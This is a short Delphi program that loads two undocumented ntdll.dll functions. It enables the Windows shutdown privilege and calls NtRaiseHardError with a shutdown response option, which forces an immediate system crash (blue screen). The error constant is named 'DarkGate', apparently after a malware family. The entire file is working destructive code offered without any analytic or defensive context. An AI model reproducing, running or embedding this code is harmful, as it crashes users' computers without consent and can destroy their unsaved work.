uses
  Winapi.Windows;

type
  NtStatus = LongInt;

function RtlAdjustPrivilege(Privilege: Cardinal; Enable: Boolean; CurrentThread: Boolean; var Enabled: Boolean): NtStatus; stdcall; external 'ntdll.dll';

function NtRaiseHardError(ErrorStatus: NtStatus; NumberOfParameters: Cardinal; UnicodeStringParameterMask: Cardinal; Parameters: Pointer; ValidResponseOption: Cardinal; var Response: Cardinal): NtStatus; stdcall; external 'ntdll.dll';

var
  Response: ULONG;
  Enabled: Boolean;

const
  DarkGate = $C0000350;

begin
  RtlAdjustPrivilege(19, True, False, Enabled);
  NtRaiseHardError(DarkGate, 0, 0, nil, 6, Response);
end.
